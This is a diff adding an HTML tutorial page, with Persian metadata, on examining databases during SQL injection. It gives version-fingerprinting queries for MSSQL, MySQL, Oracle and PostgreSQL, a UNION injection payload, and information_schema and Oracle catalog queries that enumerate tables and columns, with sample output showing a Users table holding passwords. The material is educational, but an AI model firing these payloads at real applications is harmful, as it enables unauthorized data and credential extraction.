@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>آموزش بررسی دیتابیس در حملات SQL Injection | راهنمای کامل برای اکسپلویت</title>
+    <link rel="stylesheet" href="styles.css">
+    <meta name="description" content="یادگیری روش‌های بررسی نوع و نسخه دیتابیس و لیست کردن جداول و ستون‌ها در حملات SQL Injection. این راهنما شما را با نحوه اجرای کوئری‌ها در انواع دیتابیس‌ها آشنا می‌کند." />
+    <meta name="keywords" content="SQL Injection، حمله SQLi، بررسی دیتابیس، اطلاعات دیتابیس، اطلاعات جداول، کوئری‌های دیتابیس، هک دیتابیس، امنیت سایبری، اطلاعات دیتابیس MySQL، اطلاعات دیتابیس Oracle، اطلاعات دیتابیس PostgreSQL، امنیت برنامه‌های وب" />
+    <meta name="robots" content="index, follow">
+    
+  <!-- Open Graph Meta Tags for better social sharing -->
+  <meta property="og:title" content="حملات SQL Injection | راهنمای کامل برای اکسپلویت">
+  <meta property="og:description" content="یادگیری روش‌های بررسی نوع و نسخه دیتابیس و لیست کردن جداول و ستون‌ها در حملات SQL Injection. این راهنما شما را با نحوه اجرای کوئری‌ها در انواع دیتابیس‌ها آشنا می‌کند.">
+  <meta property="og:image" content="https://nightmareshadow4exploit.github.io/Resistance/logo.png"> <!-- Replace with a relevant image -->
+  <meta property="og:url" content="http://nightmareshadow4exploit.github.io/Resistance/Knowledge/Web%20Hacking/pages/parts/SQLi/examining%20the%20DB.html"> <!-- Replace with your website URL -->
+  <meta property="og:type" content="website">
+  
+  <!-- Twitter Card Meta Tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="حملات SQL Injection | راهنمای کامل برای اکسپلویت">
+  <meta name="twitter:description" content="یادگیری روش‌های بررسی نوع و نسخه دیتابیس و لیست کردن جداول و ستون‌ها در حملات SQL Injection. این راهنما شما را با نحوه اجرای کوئری‌ها در انواع دیتابیس‌ها آشنا می‌کند.">
+  <meta name="twitter:image" content="https://nightmareshadow4exploit.github.io/Resistance/logo.png"> <!-- Replace with a relevant image -->
+  
+<script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Article",
+      "headline": ="حملات SQL Injection | راهنمای کامل برای اکسپلویت",
+      "description": "در این مقاله به بررسی تکنیک‌ها و روش‌های مختلف برای پیدا کردن و بهره‌برداری از آسیب‌پذیری‌های تزریق SQL کور پرداخته می‌شود. علاوه بر توضیحات مفصل درباره این آسیب‌پذیری، روش‌های مختلف مانند ایجاد پاسخ‌های شرطی، بهره‌برداری از خطاها، و تکنیک‌های خارج از باند برای استخراج داده‌های حساس توضیح داده شده‌اند.",
+      "author": {
+        "@type": "Person",
+        "name": "Nightmare"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "Nightmare",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://nightmareshadow4exploit.github.io/Resistance/logo.png"
+        }
+      },
+      "datePublished": "2025-01-10"
+    }
+    </script>
+</head>
+<body>
+    <div class="top-links">
+        <a href="https://nightmareshadow4exploit.github.io/Resistance">
+
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+                <!-- Roof -->
+                <path d="M2 12L12 3l10 9" fill="none" stroke="black" stroke-width="2"/>
+                <!-- House Body -->
+                <rect x="5" y="12" width="14" height="9" fill="none" stroke="black" stroke-width="2"/>
+                <!-- Door -->
+                <rect x="10" y="15" width="4" height="6" fill="none" stroke="black" stroke-width="2"/>
+              </svg>
+              
+        </a>
+        <a href="https://nightmareshadow4exploit.github.io/Resistance/Quiz/">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+                <!-- Speech Bubble -->
+                <path d="M4 4h16c1.1 0 1.99.9 1.99 2L22 18c0 1.1-.89 2-1.99 2H5c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" fill="none" stroke="black" stroke-width="2"/>
+                <!-- Question Mark -->
+                <text x="12" y="16" font-family="Arial, sans-serif" font-size="12" text-anchor="middle" fill="black">?</text>
+              </svg>
+              
+        </a>
+
+        <a target="_blank" href="https://t.me/Nightmare_Indian_Hacker">
+          
+            <img src="../../../../../imgs/telegram.svg" alt=""Telegram>
+                
+          </a>
+    </div>
+    <div class="container">
+<h2>Examining the database in SQL injection attacks</h2>
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+
+<li>The type and version of the database software.</li>
+<li>The tables and columns that the database contains.</li>
+<h2>Querying the database type and version</h2>
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+
+The following are some queries to determine the database version for some popular database types:
+
+Database type	Query
+Microsoft, MySQL	<span class="highlight">SELECT @@version</span>
+Oracle	<span class="highlight">SELECT * FROM v$version</span>
+PostgreSQL	<span class="highlight">SELECT version()</span>
+For example, you could use a UNION attack with the following input:
+
+<pre><code>
+' UNION SELECT @@version--
+
+</code></pre>
+This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
+
+<pre><code>
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49
+Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &#60;X64&#62; (Build 14393: ) (Hypervisor)
+
+</code></pre>
+
+<h2>Listing the contents of the database</h2>
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query information_schema.tables to list the tables in the database:
+
+<pre><code>
+SELECT * FROM information_schema.tables
+
+</code></pre>
+This returns output like the following:
+<pre><code>
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+
+</code></pre>
+This output indicates that there are three tables, called Products, Users, and Feedback.
+
+You can then query information_schema.columns to list the columns in individual tables:
+
+<pre><code>
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+
+</code></pre>
+This returns output like the following:
+<pre><code>
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+
+</code></pre>
+This output shows the columns in the specified table and the data type of each column.
+
+<h3>Listing the contents of an Oracle database</h3>
+On Oracle, you can find the same information as follows:
+
+<li>You can list tables by querying <span class="highlight">all_tables</span>:</li>
+
+<pre><code>
+SELECT * FROM all_tables
+
+</code></pre>
+
+<li>You can list columns by querying <span class="highlight">all_tab_columns</span>:</li>
+
+<pre><code>
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+
+</code></pre>
+
+<hr>
+<p>برای دریافت جدیدترین اخبار و منابع، به من در تلگرام بپیوندید! <a href="https://t.me/Nightmare_Indian_Hacker" target="_blank">به تلگرام بپیوندید</a></p>
+<p>بعدی: <a href="union attack.html">مقدمه‌ای بر SQLi</a></p>
+<hr>
+</div>
+
+</body>
+</html>
